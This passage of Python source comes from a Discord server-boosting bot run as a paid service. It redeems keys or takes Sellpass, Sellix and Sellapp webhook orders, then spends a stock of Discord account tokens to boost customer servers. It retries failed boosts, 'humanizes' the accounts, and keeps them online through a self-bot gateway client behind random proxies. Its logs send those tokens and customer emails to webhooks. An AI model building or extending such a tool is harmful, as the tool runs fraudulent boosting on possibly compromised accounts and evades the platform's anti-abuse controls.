            if len(filtered_keys) < quantity:
                await ctx.response.send_message("Not enough keys found for the specified criteria.")
                return
            all_keys = [key for key in all_keys if key not in filtered_keys]

        with open("data/keys/keys.json", "w") as file:
            json.dump(all_keys, file, indent=4)

        await ctx.response.send_message("Keys deleted successfully.")
    except FileNotFoundError:
      await ctx.response.send_message("No keys found.")
  else:
      await ctx.response.send_message("unauthorised")

import json

def mark_key_used(key, month, amount, invite, successful, failed, time_taken):

    with open("data/keys/keys.json", "r") as file:
        keys = json.load(file)

    updated_keys = [k for k in keys if k['key'] != key]

    with open("data/keys/keys.json", "w") as file:
        json.dump(updated_keys, file, indent=4)

    try:
        with open("data/keys/used_keys.json", "r") as file:
            used_keys = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        used_keys = []

    used_keys.append({
        "key": key,
        "month": month,
        "amount": amount,
        "invite": invite,
        "successful": successful,
        "failed" : failed,
        "time_taken" : time_taken
    })

    with open("data/keys/used_keys.json", "w") as file:
        json.dump(used_keys, file, indent=4)
def fetch_from_key(key):
    with open("data/keys/keys.json", "r") as file:
        keys = json.load(file)
        for k in keys:
            if k['key'] == key:
                return k['amount'], k['month']
    raise KeyError

def check_key_used(key):
    with open("data/keys/used_keys.json", "r") as file:
        used_keys = json.load(file)
        return key in used_keys

def update_key(key, new_amount):
    with open('data/keys/keys.json', 'r+') as file:
        keys = json.load(file)
        for item in keys:
            if item['key'] == key:
                item['amount'] = new_amount
                file.seek(0)  
                json.dump(keys, file, indent=4)
                file.truncate()  
                break  
        else:
            print(f"Key '{key}' not found in keys.json")

@bot.tree.command(
    name="auto_boosting",
    description="Shows the auto_boosting bot panel."
)
async def auto_panel(ctx, channel: discord.TextChannel = None):
    embed = discord.Embed(
        title="<:BlueCrown:1308450036652314645> `AutoBoosting`",
        description="<:Boosters:1091054020271030372> `Options`"
    )
    embed.add_field(
        name="Avaliable Option: ",
        value="<:Boosters:1091054020271030372> [ 1 ]  Automated Server Boosting With Key\n <:Boosters:1091054020271030372> [ 2 ] View Your Key Information\n<:Boosters:1091054020271030372> [ 3 ] View Stock \n<:Boosters:1091054020271030372> [ 4 ] Guide About Auto Boosting \n ```Disclaimer``` \n */use_key can be another alternative way to use keys*",
        inline=False
    ).color = 0xff0090
    cv = ctx.channel
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_message("Processing", ephemeral=True)
        if channel is None:
            await cv.send(embed=embed, view=AutoView())
        else:
            await channel.send(embed=embed, view=AutoView())
    else:
        await ctx.response.send_message("unauthorised", ephemeral=True)

class Check_Key_Modal(Modal):
    def __init__(self):
        super().__init__(title = "Boost")
        self.add_item(
            TextInput(
                label = "Key",
                placeholder = "Enter your key.",
                required = True,
                style = discord.TextStyle.short
            )
        )
    async def on_submit(self, ctx: discord.Interaction):   
        key = self.children[0].value
        try:
            with open("data/keys/keys.json", "r") as file:
                all_keys = json.load(file)

            key_info = next((k for k in all_keys if k['key'] == key), None)
            if key_info:
                embed=discord.Embed(
                        title="**Boost Bot**",
                        description=f"Key: {key_info['key']}\nMonth: {key_info['month']}\nAmount: {key_info['amount']}",
                    color=0x2F3136,
                )
                await ctx.response.send_message(embed=embed, ephemeral=True)
            else:
                await ctx.response.send_message("Key not found.", ephemeral=True)
        except FileNotFoundError:
            await ctx.response.send_message("No keys found.", ephemeral=True)

class Auto_Boost_Modal(Modal):
    def __init__(self):
        super().__init__(title = "Boost")
        self.add_item(
            TextInput(
                label = "Key",
                placeholder = "Enter your key.",
                required = True,
                style = discord.TextStyle.short
            )
        )
        self.add_item(
            TextInput(
                label = "Invite",
                placeholder = "Invite code of the server.",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx: discord.Interaction):

        key = self.children[0].value
        invite_code = self.children[1].value


        try:
            amount, months = fetch_from_key(key)
        except KeyError:
            await ctx.response.send_message(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid key or key not found.",
                    color=0x2F3136,
                ), ephemeral=True
            )
        await ctx.response.defer()

        if amount % 2 != 0:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Number of boosts should be in even numbers.",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if months != 1 and months != 3:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid months [VALID INPUTS: 1/3].",
                    color=0x2F3136,
                ), ephemeral=True
            )

        inviteCode = getinviteCode(invite_code)
        inviteData = checkInvite(inviteCode)

        if inviteData == False:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid invite provided.",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        tokensStock = getStock(filename)
        requiredStock = int(amount / 2)

        if requiredStock > len(tokensStock):
            await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description=f"❎ | We don't have enough tokens in stock\nUse `/restock` command to restock.",
                    color=0x2F3136,
                ), ephemeral=True
            )
        booster = Booster()

        tokens = []

        for x in range(requiredStock):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)

        await ctx.followup.send(
            embed=discord.Embed(
                title="Boost Bot", description=f"Boosting....", color=0x2F3136
            ), ephemeral=True
        )

        start = time.time()
        status = booster.thread(inviteCode, tokens, inviteData)

        time_taken = round(time.time() - start, 2)
        new_len = len(status["failed"]) * 2 + len(status["captcha"]) * 2 
        if len(status['failed']) > 0 or len(status['captcha']):
            embed = discord.Embed(
        title="Failed Boosts",
        description=f"Due to some issues there was some issues in the tokens such as captcha/invalid/flagged. No of failed boosts  {len(status['failed'])*2}. But don't worry your key balance is not reduced for failed boosts. You can retry with the same key with the existing balance. Sorry for the inconvenience caused. If you still face any type of issue make sure to contact the server management! \n Update Key Information -> \n **Balance** - {new_len} Boosts \n", 
        color=0x2F3136
    )
            await ctx.followup.send(embed=embed, ephemeral=True)
            content = ""
            if webhook_url != "" and use_log == True:
                embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Failure Detected ->**\n ``` User-ID : {ctx.user.id} \n User-Mention : {ctx.user} \n Key - {key} \n Amount : {amount} \n Month : {months} \n Failed-Boosts : {len(status['failed']) * 2} \n  Captcha-Boosts : {len(status['captcha']) * 2} \n  ``` **Failed Boosts** ```{status['failed']}```  \n**Captcha** ```{status['captcha']}``` \n **Success** \n ``` {status['success']}```", color=0x2F3136)
                send_webhook_message(webhook_url, content, embed)
            update_key(key, new_len)
        else:   
            mark_key_used(key, months, amount, invite_code, len(status['success']), len(status['failed']), time_taken)

        await ctx.followup.send(
            embed=discord.Embed(
                title="**Boosts Data**",
                description=f"**Amount :**  {amount} boosts \n**Months :** {months}m \n**Server Link : ** .gg/{inviteCode} \n**Tokens: ** {requiredStock} \n**Success :** {len(status['success'])*2} \n**Failed :** {len(status['failed'])*2}\n \n  **Captcha-Boosts** : {len(status['captcha']) * 2} \n  **Time taken :** {time_taken}s",
                color=0x2F3136,
            ), ephemeral=True
        )
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="**Boosting Data**", description=f"**__Amount__ ->**  {amount} boosts \n**__Months__ ->** {months}m \n**__Server Link__ ->** .gg/{inviteCode} \n**__Tokens__ ->** {requiredStock} \n**__Success__ ->** {len(status['success'])*2} \n**__Failed__ ->** {len(status['failed'])}\n**__Time taken__ ->** {time_taken}s \n ** Failed/Invalid ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Other Information** \n ``` User ID -> {ctx.user.id} \n User Mention - {ctx.user} \n Key - {key} ```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)

        try:
            if config['auto_config']['Use_customization']:
                                    booster.humanizerthread(tokens=status['success'])
        except Exception as e:
            print(e)


class StockModal(Modal):
    def __init__(self):
        super().__init__(title = "Normal Stocks")

        self.add_item(
            TextInput(
                label = "Duration",
                placeholder = "Months? [1/3]",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx: Interaction):

        duration = int(self.children[0].value)

        await ctx.response.defer(ephemeral=False)

        if duration != 1 and duration != 3 and duration != 0:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid type. [1/3] are valid inputs.",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if duration == 1:
            fileName = "data/1m.txt"
        elif duration == 3:
            fileName = "data/3m.txt"

        stock = len(open(fileName, "r").readlines())
        if len(open(fileName, "r").readlines()) == 0:
            stock = 0

        return await ctx.followup.send(
            embed=discord.Embed(
                title=f"<:BlueCrown:1308450036652314645> ```{duration}m Tokens Normal Stock```",
                description=f"\n <:Boosters:1091054020271030372> *`{stock}` Nitro Tokens In Stock* \n *<:Boosters:1091054020271030372> `{stock * 2}` Boosts Avaliable In Stock*",
                color=0xff008c,
            ), ephemeral=True
        )

@bot.tree.command(
 name="stock", description="Display the stock of boosts and tokens."
)
async def stock(
    ctx
): 
     member = ctx.guild.get_member(ctx.user.id)
     if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles): 
      await ctx.response.send_modal(StockModal())
     else:
         await ctx.response.send_message("unauthorised")


@bot.tree.command(name='get_key_information', description="Command to get information about a specific key")
async def get_key_information(ctx, key: str):
    try:
        with open("data/keys/keys.json", "r") as file:
            all_keys = json.load(file)

        key_info = next((k for k in all_keys if k['key'] == key), None)
        if key_info:
            embed=discord.Embed(
                    title="**Boost Bot**",
                    description=f"Key: {key_info['key']}\nMonth: {key_info['month']}\nAmount: {key_info['amount']}",
                    color=0x2F3136,
                )
            await ctx.response.send_message(embed=embed)
        else:
            await ctx.response.send_message("Key not found.")
    except FileNotFoundError:
        await ctx.response.send_message("No keys found.")
@bot.tree.command(name='key_stats', description="Command to show statistics about keys")
async def key_stats(ctx):
    try:
        with open("data/keys/keys.json", "r") as file:
            all_keys = json.load(file)

        one_month_keys = sum(1 for key in all_keys if key['month'] == 1)
        three_month_keys = sum(1 for key in all_keys if key['month'] == 3)

        amount_stats = {}
        amount_stats_with_months = {}

        for key in all_keys:
            amount = key['amount']
            if amount in amount_stats:
                amount_stats[amount] += 1
            else:
                amount_stats[amount] = 1

            if amount in amount_stats_with_months:
                amount_stats_with_months[amount]['total'] += 1
                if key['month'] == 1:
                    amount_stats_with_months[amount]['1m'] += 1
                elif key['month'] == 3:
                    amount_stats_with_months[amount]['3m'] += 1
            else:
                amount_stats_with_months[amount] = {'total': 1, '1m': 0, '3m': 0}
                if key['month'] == 1:
                    amount_stats_with_months[amount]['1m'] += 1
                elif key['month'] == 3:
                    amount_stats_with_months[amount]['3m'] += 1

        stats_message = f"1 Month Keys: {one_month_keys}\n3 Month Keys: {three_month_keys}\n\nAmount Statistics:\n"
        for amount, count in amount_stats.items():
            stats_message += f"{amount} amount keys: {count} (1m: {amount_stats_with_months[amount]['1m']}, 3m: {amount_stats_with_months[amount]['3m']})\n"
            embed=discord.Embed(
                    title="**Boost Bot**",
                    description=stats_message,
                    color=0x2F3136,
                )
        await ctx.response.send_message(embed=discord.Embed(
                    title="**Boost Bot**",
                    description=stats_message,
                    color=0x2F3136,
                ))
    except FileNotFoundError:
        await ctx.response.send_message("No keys found.")

@bot.tree.command(name='get_used_key_information', description="Command to get information about a specific used key")
async def get_used_key_information(ctx, key: str):
    try:
        with open("data/keys/used_keys.json", "r") as file:
            all_keys = json.load(file)

        key_info = next((k for k in all_keys if k['key'] == key), None)
        if key_info:
            embed=discord.Embed(
                    title="**Boost Bot**",
                    description=f"Key: {key_info['key']}\nMonth: {key_info['month']}\nAmount: {key_info['amount']} \n Successful: {key_info['successful']} \n Failed: {key_info['failed']} \n Time-Taken: {key_info['time_taken']}s \n Invite: {key_info['invite']}",
                    color=0x2F3136,
                )

            await ctx.response.send_message(embed=embed)
        else:
            await ctx.response.send_message("Key not found.")
    except FileNotFoundError:
        await ctx.response.send_message("No keys found.")
import discord

@bot.tree.command(name='get_key', description="Command to get keys for key order system")
async def get_key(ctx, month: int, amount: int):
  member = ctx.guild.get_member(ctx.user.id)
  if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
    try:
        with open("data/keys/keys.json", "r") as file:
            all_keys = json.load(file)

        filtered_keys = [key for key in all_keys if key['month'] == month and key['amount'] == amount]
        if not filtered_keys:
            await ctx.response.send_message("No keys found for the specified criteria.")
            return

        key_to_send = filtered_keys[0]  

        embed = discord.Embed(title="Filtered Key", color=0x2F3136)
        embed.add_field(name="Month", value=key_to_send['month'], inline=False)
        embed.add_field(name="Amount", value=key_to_send['amount'], inline=False)
        embed.add_field(name="Key", value=key_to_send['key'], inline=False)

        await ctx.response.send_message(embed=embed)
    except FileNotFoundError:
              await ctx.response.send_message("No keys found.")
  else:
      await ctx.response.send_message("Unauthorised")

@bot.tree.command(name='delete_key', description="Command to delete a specific key from the system")
async def delete_key(ctx, key_to_delete: str):
    member = ctx.guild.get_member(ctx.user.id)

    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        try:
            with open("data/keys/keys.json", "r") as file:
                all_keys = json.load(file)

            filtered_keys = [key for key in all_keys if key['key'] == key_to_delete]
            if not filtered_keys:
                await ctx.response.send_message("Key not found.")
                return

            all_keys = [key for key in all_keys if key not in filtered_keys]

            with open("data/keys/keys.json", "w") as file:
                json.dump(all_keys, file, indent=4)
            embed = discord.Embed(title="Key Deleted!" , description=f"{key_to_delete} successfully deleted", color=0x2F3136)
            await ctx.response.send_message(embed=embed)
        except FileNotFoundError:
            await ctx.response.send_message("No keys found.")
    else:
        await ctx.response.send_message("Unauthorized")
@bot.tree.command(name='failed', description="Command to get failed tokens and send them to DMs")
async def get_failed_tokens(ctx):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        try:
            with open("data/output/failed_boosts.txt", "r") as file:
                failed_tokens = file.read()

            await ctx.user.send(failed_tokens)

            embed = discord.Embed(
                title="Success",
                description="Failed tokens successfully sent to your DMs.",
                color=0x2F3136
            )
        except Exception as e:
            embed = discord.Embed(
                title="Error",
                description=f"An error occurred: {str(e)}",
                color=0xFF0000
            )
    else:
        embed = discord.Embed(
            title="Unauthorized",
            description="You are not authorized to use this command.",
            color=0xFF0000
        )

    await ctx.response.send_message(embed=embed)

@bot.tree.command(name='filecleaner', description="Command to clean token file content")
async def clean_token_file(ctx, file_name: str):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):  
        try:
            if file_name == '1':
                file_path = "data/1m.txt"
            elif file_name == '3':
                file_path = "data/3m.txt"
            else:
                await ctx.response.send_message("Invalid file name. Please provide either '1' or '3'.", ephemeral=True)
                return

            with open(file_path, "w") as file:
                file.truncate(0)  

            await ctx.response.send_message("Token file cleaned successfully.", ephemeral=True)
        except FileNotFoundError:
            await ctx.response.send_message("No such file found.")
    else:
        await ctx.response.send_message("Unauthorized")
@bot.tree.command(name='use_key', description="Command to use a key for autoboosting")
async def get_used_key_information(ctx):
    await ctx.response.send_modal(Auto_Boost_Modal())

app = FastAPI()
@app.post('/sellpass')
async def get_sellpass(data: dict):
    invoiceid = data['InvoiceId']
    shop_id = data['Product']['ShopId']
    api_key = config['sellpass']['api_key']
    header = {"Authorization": f"Bearer {api_key}"}
    r = httpx.get(f'https://dev.sellpass.io/self/{shop_id}/invoices/{invoiceid}', headers=header)
    if r.status_code < 250:

        r1 = r.json()
        custom_fields = r1['data']['partInvoices'][0]['customFields']
        for field in custom_fields:
            if field['customField']['name'] == config['sellpass']['custom_field_name']:
                invite = field['valueString']
                break

        title = r1['data']['partInvoices'][0]['product']['title']
        email = r1['data']['customerInfo']['customerForShop']['customer']['email']
        match = re.search(r'\d+', title)

        if match:
            amount = int(match.group())
            start_index = title.find('[') + 1
            end_index = title.find(']', start_index)
            months_str = title[start_index:end_index]
            months = int(''.join(filter(str.isdigit, months_str)))

        inviteCode = getinviteCode(invite)
        inviteData = checkInvite(inviteCode)

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        requiredStock = int(amount / 2)
        tokensStock = getStock(filename)
        if inviteData != False:
            if requiredStock > len(tokensStock):
                content = ""
                embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Stock Out ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Invite: {invite} \n Autobuy-Platform : Sellix```", color=0x2F3136)
                send_webhook_message(webhook_url, content, embed)
            else:     
                boost = Booster()
                tokens = []
                for x in range(requiredStock):
                    tokens.append(tokensStock[x])
                    remove(tokensStock[x], filename)
                start = time.time()
                status = boost.thread(inviteCode, tokens, inviteData)
                v1 = True
                i = 0
                retry = config['auto_config']['max_retry_on_failure']
                loop_try = True
                while len(status['success']) < amount and i < retry and loop_try != False:
                    requiredStock1 = int((amount-len(status['success']))/2)
                    n_tokens = []
                    tokensStock1 = getStock(filename)
                    for x in range(requiredStock1):  
                        try:
                            n_tokens.append(tokensStock1[x]) 
                            remove(tokensStock1[x], filename)
                            status = boost.thread(inviteCode, n_tokens, inviteData)
                            
                            try:
                                if config['auto_config']['Use_customization']:
                                    boost.humanizerthread(tokens=status['success'])
                            except Exception as e:
                                print(e)
                            i = i+1
                        except IndexError:
                            loop_try = False
                            logging.error("Stock Out While Retrying Autobuy Order!")
                            break


                time_taken = round(time.time() - start, 2)
                loop_try = True
                if len(status['failed']) > 0 or len(status['captcha']):
                    content = ""
                    if webhook_url != "" and use_log == True:
                        embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Failure Detected ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Customer-Email : {email} \n Invite : {invite}``` \n ``` Failed-Boosts : {len(status['failed']) * 2} \n  Captcha-Boosts : {len(status['captcha']) * 2} \n  ``` **Failed Boosts** ```{status['failed']}```  \n**Captcha** ```{status['captcha']}``` \n **Note**``` This is not the final outcome! If you have retries enabled then the bot will futher retry with the remaining stock!```", color=0x2F3136)
                        send_webhook_message(webhook_url, content, embed)

                content = ""
                if webhook_url != "" and use_log == True:
                    embed = DiscordEmbed(title="**Boosting Data**", description=f"**__Amount__ ->**  {amount} boosts \n**__Months__ ->** {months}m \n**__Server Link__ ->** .gg/{inviteCode} \n**__Tokens__ ->** {requiredStock} \n**__Success__ ->** {len(status['success'])*2} \n**__Failed__ ->** {len(status['failed'])}\n**__Time taken__ ->** {time_taken}s \n ** Failed/Invalid ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Other Information** \n ``` \n Customer Invoice - {invoiceid} \n AutoBuy - Sellpass \n Customer-Email : {email} \n Invite : {invite} \n Retry : {i}/{retry}```", color=0x2F3136)
                    send_webhook_message(webhook_url, content, embed)

                try:
                    if config['auto_config']['Use_customization']:
                                    boost.humanizerthread(tokens=status['success'])
                except Exception as e:
                    print(e)
                if len(status['success']) == amount:
                    success_note_sellpass = config['sellpass']['boosts_success_note']
                    return f"{success_note_sellpass}"
                else:
                    fail_note_sellpass = config['sellpass']['boosts_fail_note']
                    return f"{fail_note_sellpass}"
        else:
            content = ""
            embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Invalid Invite Link ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Invite: {invite}```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)
            return f"Invalid invite link passed!" 

    else: 
        logging.error("Invalid sellpass api key passed! [ Make sure to check the guide to get a valid api key! ]")
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="**Invalid Sellpass Api Key Passed**", description=f" Invalid sellpass api key passed! [ Make sure to check the guide to get a valid api key! ]", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)  
        return f'Invalid api key passed!'

orders_sellapp = []
orders_sellix = []


@app.route("/sellix", methods=["POST"])
def sellix():
    data = request.json
    if data in orders_sellix:
        pass
    elif data not in orders_sellix:
        threading.Thread(
            target=sellixshit,
            args=[
                data,
            ],
        ).start()
        orders_sellix.append(data)
    return jsonify({"message": f"We've recieved your order"}), 200


def sellixshit(data):
    """"""
    invite = ""
    title = data["data"]["product_title"].lower()

    split_parts = title.split(" | ")

    amount = int(split_parts[0].split()[0])
    months = int(split_parts[1].split()[0])

    if amount == None or months == None:
        return

    for i in data["data"]["custom_fields"]:
        if i == config["sellix"]["invite_field_name"]:
            invite = data["data"]["custom_fields"][i]

    order_id = data["data"]["uniqid"]
    email = data["data"]["customer_email"]
    product = data["data"]["product_title"]

    inviteCode = getinviteCode(invite)
    inviteData = checkInvite(inviteCode)

    embeds_data = {
        "embeds": [
            {
                "title": "**Sellix Order**",
                "description": f"**Order ID: **{order_id}\n**Email: **{email}\n**Product: **{product}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n**Invite: **[{inviteCode}](https://discord.gg/{inviteCode})",
            }
        ]
    }

    response = httpx.post(
        config["sellix"]["orders"],
        data=json.dumps(embeds_data),
        headers={"Content-Type": "application/json"},
    )

    if response.status_code == 204:
        """"""
    else:
        print(response.json())

    if inviteData == False:
        return print(f"[ERROR]: Invalid invite was provided for order: {order_id}")

    if months == 1:
        filename = "data/1m.txt"
    if months == 3:
        filename = "data/3m.txt"

    tokensStock = getStock(filename)
    requiredStock = int(amount / 2)

    if requiredStock > len(tokensStock):
        return print(
            f"[ERROR]: We didn't had enough boosts to satisfy order: {order_id}"
        )

    tokens = []

    for x in range(requiredStock):
        tokens.append(tokensStock[x])
        remove(tokensStock[x], filename)

    cool = Booster()
    status = cool.thread(inviteCode, tokens, inviteData)
    success = status["success"]
    failed = status["failed"]

    print(
        f"{Fore.GREEN}[+]: Attempted to do {Fore.BLUE}{amount}x{Fore.RESET} {Fore.GREEN}boosts for {order_id} order id. {Fore.RESET} {Fore.CYAN}\n[-]: Successfully did {Fore.RESET}{len(success)}x boost. {Fore.CYAN}\n[-]: Failed to do {Fore.RESET}{len(failed)}x boosts.\n\n    Results \n[Success]: {success}\n[Failed]: {failed} \n\n"
    )

    completed_data = {
        "embeds": [
            {
                "title": "**Sellix Completion**",
                "description": f"**Order ID: **{order_id}\n**Email: **{email}\n**Product: **{product}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n**Invite: **[{inviteCode}](https://discord.gg/{inviteCode}) \n\n**[SUCCESS]**: {success} \n**[FAILED]**: {failed}",
            }
        ]
    }

    response = httpx.post(
        config["sellapp"]["orders"],
        data=json.dumps(completed_data),
        headers={"Content-Type": "application/json"},
    )

    if response.status_code == 204:
        """"""
    else:
        print(response.json())



@app.post('/sellapp')
async def get_sellpass(data: dict):
    invoiceid = data['invoice']['id']
    r = data
    v1 = config['sellapp']['enabled']
    if v1 == True:

        r1 = r
        custom_fields = r1['additional_information']
        try: 
            invite_field_name = config['sellapp']['invite_field_name']
        except:
            logging.error("Make sure to recheck your invite field name [ Autobuy - Sellapp ]")
 
        nick_field_name = config['sellapp']['customisation']['nickname_field_name']
        bio_field_name = config['sellapp']['customisation']['bio_field_name']



        try: 
            for item in custom_fields:
                if item['label'] == invite_field_name:
                    invite = item['value']
        except:
            logging.error('Invalid invite field name passed make sure to recheck! [ Sellix Autoboosting ]')
            


        title = r1['listing']['title']
        email = r1['invoice']['payment']['gateway']['data']['customer_email']
        match = re.search(r'\d+', title)

        if match:
            amount = int(match.group())
            start_index = title.find('[') + 1
            end_index = title.find(']', start_index)
            months_str = title[start_index:end_index]
            months = int(''.join(filter(str.isdigit, months_str)))

        inviteCode = getinviteCode(invite)
        inviteData = checkInvite(inviteCode)

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        requiredStock = int(amount / 2)
        tokensStock = getStock(filename)
        if inviteData != False:
            if requiredStock > len(tokensStock):
                content = ""
                embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Stock Out ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Invite: {invite} \n Autobuy-Platform : Sellapp```", color=0x2F3136)
                send_webhook_message(webhook_url, content, embed)
            else:     
                boost = Booster()
                tokens = []
                for x in range(requiredStock):
                    tokens.append(tokensStock[x])
                    remove(tokensStock[x], filename)
                start = time.time()
                status = boost.thread(inviteCode, tokens, inviteData)
                v1 = True
                i = 0
                retry = config['auto_config']['max_retry_on_failure']
                loop_try = True
                while len(status['success']) < amount and i < retry and loop_try != False:
                    requiredStock1 = int((amount-len(status['success']))/2)
                    n_tokens = []
                    tokensStock1 = getStock(filename)
                    for x in range(requiredStock1):  
                        try:
                            n_tokens.append(tokensStock1[x]) 
                            remove(tokensStock1[x], filename)
                            status = boost.thread(inviteCode, n_tokens, inviteData)
                            try:
                                if config['auto_config']['Use_customization']:
                                    boost.humanizerthread(tokens=status['success'])
                            except Exception as e:
                                print(e)
                            i = i+1
                        except IndexError:
                            loop_try = False
                            logging.error("Stock Out While Retrying Autobuy Order!")
                            break


                time_taken = round(time.time() - start, 2)
                loop_try = True
                if len(status['failed']) > 0 or len(status['captcha']) :
                    content = ""
                    if webhook_url != "" and use_log == True:
                        embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Failure Detected ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Customer-Email : {email} \n Invite : {invite}``` \n ``` Failed-Boosts : {len(status['failed']) * 2} \n  Captcha-Boosts : {len(status['captcha']) * 2} \n ``` **Failed Boosts** ```{status['failed']}```  \n**Captcha** ```{status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Note**``` This is not the final outcome! If you have retries enabled then the bot will futher retry with the remaining stock!```", color=0x2F3136)
                        send_webhook_message(webhook_url, content, embed)

                content = ""
                if webhook_url != "" and use_log == True:
                    embed = DiscordEmbed(title="**Boosting Data**", description=f"**__Amount__ ->**  {amount} boosts \n**__Months__ ->** {months}m \n**__Server Link__ ->** .gg/{inviteCode} \n**__Tokens__ ->** {requiredStock} \n**__Success__ ->** {len(status['success'])*2} \n**__Failed__ ->** {len(status['failed'])}\n**__Time taken__ ->** {time_taken}s \n ** Failed/Invalid ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Other Information** \n ``` \n Customer Invoice - {invoiceid} \n AutoBuy - Sellapp \n Customer-Email : {email} \n Invite : {invite} \n Retry : {i}/{retry}```", color=0x2F3136)
                    send_webhook_message(webhook_url, content, embed)
        
                try:
                    if config['auto_config']['Use_customization']:
                                    boost.humanizerthread(tokens=status['success'])
                except Exception as e:
                    print(e)
        else:
            content = ""
            embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Invalid Invite Link ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Invite: {invite}```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)

    else: 
        logging.error("If you wanna use sellapp service then make sure to enable it from config file!")
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="**Sellapp Setup Error**", description=f"If you wanna use sellapp service then make sure to enable it from config file!", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed) 
# onliner start
class Status(Enum):
    ONLINE = "online"
    DND = "dnd"
    IDLE = "idle"

class Activity(Enum):
    GAME = 0  
    STREAMING = 1 
    LISTENING = 2 
    WATCHING = 3 
    CUSTOM = 4 
    COMPETING = 5  

class OPCodes(Enum):
    Dispatch = 0  
    Heartbeat = 1
    Identify = 2  
    PresenceUpdate = 3  
    VoiceStateUpdate = 4  
    Resume = 6  
    Reconnect = 7  
    RequestGuildMembers = (
        8  
    )
    InvalidSession = 9 
    Hello = (
        10 
    )
    HeartbeatACK = 11 

class DiscordIntents(IntEnum):
    GUILDS = 1 << 0
    GUILD_MEMBERS = 1 << 1
    GUILD_MODERATION = 1 << 2
    GUILD_EMOJIS_AND_STICKERS = 1 << 3
    GUILD_INTEGRATIONS = 1 << 4
    GUILD_WEBHOOKS = 1 << 5
    GUILD_INVITES = 1 << 6
    GUILD_VOICE_STATES = 1 << 7
    GUILD_PRESENCES = 1 << 8
    GUILD_MESSAGES = 1 << 9
    GUILD_MESSAGE_REACTIONS = 1 << 10
    GUILD_MESSAGE_TYPING = 1 << 11
    DIRECT_MESSAGES = 1 << 12
    DIRECT_MESSAGE_REACTIONS = 1 << 13
    DIRECT_MESSAGE_TYPING = 1 << 14
    MESSAGE_CONTENT = 1 << 15
    GUILD_SCHEDULED_EVENTS = 1 << 16
    AUTO_MODERATION_CONFIGURATION = 1 << 20
    AUTO_MODERATION_EXECUTION = 1 << 21

class Presence:
    def __init__(self, online_status: Status) -> None:
        self.online_status: Status = online_status
        self.activities: List[Activity] = []

    def addActivity(
        self, name: str, activity_type: Activity, url: Optional[str]
    ) -> int:
        self.activities.append(
            {
                "name": name,
                "type": activity_type.value,
                "url": url if activity_type == Activity.STREAMING else None,
            }
        )
        return len(self.activities) - 1

    def removeActivity(self, index: int) -> bool:

        if index < 0 or index >= len(self.activities):
            return False
        self.activities.pop(index)
        return True

class DiscordWebSocket:
    def __init__(self) -> None:
        try:
            self.websocket_instance(
            "wss://gateway.discord.gg/?v=10&encoding=json", proxy=random.choice(open("data/proxies.txt", "r").read().splitlines())
        )
        except:
            self.websocket_instance(
            "wss://gateway.discord.gg/?v=10&encoding=json"
        )

        self.heartbeat_counter = 0

        self.username: str = None
